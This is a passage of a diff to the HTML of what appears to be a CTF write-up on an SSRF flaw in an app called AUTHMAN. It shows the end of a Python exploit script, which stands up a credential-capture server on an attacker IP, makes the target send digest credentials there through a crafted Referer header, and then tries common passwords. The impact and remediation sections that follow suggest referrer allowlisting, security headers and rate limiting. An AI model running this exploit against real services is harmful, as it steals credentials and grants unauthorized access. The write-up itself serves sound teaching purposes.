+</span></span><span class="line"><span class="cl">    <span class="n">capture_app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="n">ATTACKER_SERVER_PORT</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">use_reloader</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Step 2: Main exploit</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Starting AUTHMAN SSRF Exploit...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] Target: </span><span class="si">{</span><span class="n">TARGET_URL</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] Attacker server: http://</span><span class="si">{</span><span class="n">ATTACKER_IP</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">ATTACKER_SERVER_PORT</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Start capture server in background</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[*] Starting credential capture server...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">capture_thread</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">run_capture_server</span><span class="p">,</span> <span class="n">daemon</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">capture_thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>  <span class="c1"># Wait for server to start</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Trigger SSRF</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[*] Triggering SSRF vulnerability...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">TARGET_URL</span><span class="si">}</span><span class="s2">/api/check&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;Referer&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;http://</span><span class="si">{</span><span class="n">ATTACKER_IP</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">ATTACKER_SERVER_PORT</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] SSRF triggered! Status: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Response: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[-] Error triggering SSRF: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Wait for credentials to be captured</span>
+</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">captured_creds</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] No credentials captured. Attack failed.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[+] SUCCESS! Captured credentials:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;    Username: </span><span class="si">{</span><span class="n">captured_creds</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Step 3: Use captured username to authenticate</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Since we know the username, we can now try to authenticate</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># In a real scenario, you&#39;d need to crack the password or replay the auth</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[*] Attempting to access protected endpoint...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[!] Note: You need the actual password to complete authentication&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[!] The captured digest can be used for offline cracking&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">username</span> <span class="o">=</span> <span class="n">captured_creds</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[+] Captured username: </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] You can now attempt to:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;    1. Brute force the password using digest cracking&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;    2. If password is weak, try common passwords:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Try common passwords</span>
+</span></span><span class="line"><span class="cl">    <span class="n">common_passwords</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">,</span> <span class="s1">&#39;123456&#39;</span><span class="p">,</span> <span class="s1">&#39;admin&#39;</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s1">123&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">password</span> <span class="ow">in</span> <span class="n">common_passwords</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">TARGET_URL</span><span class="si">}</span><span class="s2">/auth&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="n">auth</span><span class="o">=</span><span class="n">HTTPDigestAuth</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                <span class="n">timeout</span><span class="o">=</span><span class="mi">3</span>
+</span></span><span class="line"><span class="cl">            <span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">resp</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[+++] AUTHENTICATION SUCCESS with password: </span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+++] FLAG CAPTURED:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[-] Common passwords failed. Manual cracking required.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] Digest auth details captured: </span><span class="si">{</span><span class="n">captured_creds</span><span class="p">[</span><span class="s1">&#39;full_auth&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exploit</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Run the exploit:</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 exploit.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><hr>
 <h2 id="impact-assessment">Impact Assessment<a hidden class="anchor" aria-hidden="true" href="#impact-assessment">#</a></h2>
 <h3 id="confidentiality">Confidentiality<a hidden class="anchor" aria-hidden="true" href="#confidentiality">#</a></h3>
 <p><strong>HIGH</strong> - Valid authentication credentials can be exfiltrated, allowing unauthorized access to protected resources and the FLAG.</p>
@@ -539,42 +929,89 @@ Headers:
 <ol>
 <li><strong>Remove the vulnerable endpoint</strong> (if not needed):</li>
 </ol>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Delete the /api/check endpoint entirely</span>
-</span></span></code></pre></div><ol start="2">
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Delete the /api/check endpoint entirely</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="2">
 <li><strong>Validate and whitelist referrer</strong>:</li>
 </ol>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> urllib.parse <span style="color:#f92672">import</span> urlparse
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>ALLOWED_HOSTS <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;yourdomain.com&#39;</span>, <span style="color:#e6db74">&#39;localhost&#39;</span>]
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/api/check&#39;</span>,methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>])
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check</span>():
-</span></span><span style="display:flex;"><span>    referrer <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>referrer
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Validate referrer exists</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> referrer:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#39;error&#39;</span>: <span style="color:#e6db74">&#39;No referrer&#39;</span>}), <span style="color:#ae81ff">400</span>
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Parse and validate</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
-</span></span><span style="display:flex;"><span>        parsed <span style="color:#f92672">=</span> urlparse(referrer)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> parsed<span style="color:#f92672">.</span>hostname <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> ALLOWED_HOSTS:
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#39;error&#39;</span>: <span style="color:#e6db74">&#39;Invalid referrer&#39;</span>}), <span style="color:#ae81ff">403</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> parsed<span style="color:#f92672">.</span>scheme <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> [<span style="color:#e6db74">&#39;http&#39;</span>, <span style="color:#e6db74">&#39;https&#39;</span>]:
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#39;error&#39;</span>: <span style="color:#e6db74">&#39;Invalid protocol&#39;</span>}), <span style="color:#ae81ff">403</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#39;error&#39;</span>: <span style="color:#e6db74">&#39;Invalid URL&#39;</span>}), <span style="color:#ae81ff">400</span>
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Rest of the logic...</span>
-</span></span></code></pre></div><ol start="3">
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">urlparse</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ALLOWED_HOSTS</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;yourdomain.com&#39;</span><span class="p">,</span> <span class="s1">&#39;localhost&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/api/check&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">check</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">referrer</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">referrer</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Validate referrer exists</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">referrer</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s1">&#39;error&#39;</span><span class="p">:</span> <span class="s1">&#39;No referrer&#39;</span><span class="p">}),</span> <span class="mi">400</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Parse and validate</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">parsed</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">(</span><span class="n">referrer</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">parsed</span><span class="o">.</span><span class="n">hostname</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">ALLOWED_HOSTS</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s1">&#39;error&#39;</span><span class="p">:</span> <span class="s1">&#39;Invalid referrer&#39;</span><span class="p">}),</span> <span class="mi">403</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">parsed</span><span class="o">.</span><span class="n">scheme</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">[</span><span class="s1">&#39;http&#39;</span><span class="p">,</span> <span class="s1">&#39;https&#39;</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s1">&#39;error&#39;</span><span class="p">:</span> <span class="s1">&#39;Invalid protocol&#39;</span><span class="p">}),</span> <span class="mi">403</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s1">&#39;error&#39;</span><span class="p">:</span> <span class="s1">&#39;Invalid URL&#39;</span><span class="p">}),</span> <span class="mi">400</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Rest of the logic...</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="3">
 <li><strong>Never send credentials to user-controlled URLs</strong>:</li>
 </ol>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/api/check&#39;</span>,methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>])
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check</span>():
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Check authentication status locally instead</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Don&#39;t make external requests with credentials</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#39;status&#39;</span>: <span style="color:#e6db74">&#39;authenticated&#39;</span> <span style="color:#66d9ef">if</span> auth<span style="color:#f92672">.</span>current_user() <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#39;unauthenticated&#39;</span>})
-</span></span></code></pre></div><h3 id="long-term-security-improvements">Long-term Security Improvements<a hidden class="anchor" aria-hidden="true" href="#long-term-security-improvements">#</a></h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/api/check&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">check</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Check authentication status locally instead</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Don&#39;t make external requests with credentials</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s1">&#39;status&#39;</span><span class="p">:</span> <span class="s1">&#39;authenticated&#39;</span> <span class="k">if</span> <span class="n">auth</span><span class="o">.</span><span class="n">current_user</span><span class="p">()</span> <span class="k">else</span> <span class="s1">&#39;unauthenticated&#39;</span><span class="p">})</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="long-term-security-improvements">Long-term Security Improvements<a hidden class="anchor" aria-hidden="true" href="#long-term-security-improvements">#</a></h3>
 <ol>
 <li>
 <p><strong>Implement proper authentication checks</strong>:</p>
@@ -588,14 +1025,27 @@ Headers:
 <p><strong>Add security headers</strong>:</p>
 </li>
 </ol>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@app.after_request</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">set_security_headers</span>(response):
-</span></span><span style="display:flex;"><span>    response<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#39;X-Content-Type-Options&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;nosniff&#39;</span>
-</span></span><span style="display:flex;"><span>    response<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#39;X-Frame-Options&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;DENY&#39;</span>
-</span></span><span style="display:flex;"><span>    response<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#39;Content-Security-Policy&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;default-src &#39;self&#39;&#34;</span>
-</span></span><span style="display:flex;"><span>    response<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#39;Strict-Transport-Security&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;max-age=31536000; includeSubDomains&#39;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> response
-</span></span></code></pre></div><ol start="3">
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.after_request</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">set_security_headers</span><span class="p">(</span><span class="n">response</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;X-Content-Type-Options&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;nosniff&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;X-Frame-Options&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;DENY&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Content-Security-Policy&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;default-src &#39;self&#39;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Strict-Transport-Security&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;max-age=31536000; includeSubDomains&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">response</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="3">
 <li>
 <p><strong>Use HTTPS only</strong>:</p>
 <ul>
@@ -607,25 +1057,52 @@ Headers:
 <p><strong>Implement rate limiting</strong>:</p>
 </li>
 </ol>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask_limiter <span style="color:#f92672">import</span> Limiter
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>limiter <span style="color:#f92672">=</span> Limiter(app, key_func<span style="color:#f92672">=</span><span style="color:#66d9ef">lambda</span>: request<span style="color:#f92672">.</span>remote_addr)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/api/check&#39;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@limiter.limit</span>(<span style="color:#e6db74">&#34;10 per minute&#34;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check</span>():
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># ...</span>
-</span></span></code></pre></div><ol start="5">
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask_limiter</span> <span class="kn">import</span> <span class="n">Limiter</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">limiter</span> <span class="o">=</span> <span class="n">Limiter</span><span class="p">(</span><span class="n">app</span><span class="p">,</span> <span class="n">key_func</span><span class="o">=</span><span class="k">lambda</span><span class="p">:</span> <span class="n">request</span><span class="o">.</span><span class="n">remote_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/api/check&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@limiter.limit</span><span class="p">(</span><span class="s2">&#34;10 per minute&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">check</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># ...</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="5">
 <li><strong>Add logging and monitoring</strong>:</li>
 </ol>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> logging
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/api/check&#39;</span>)
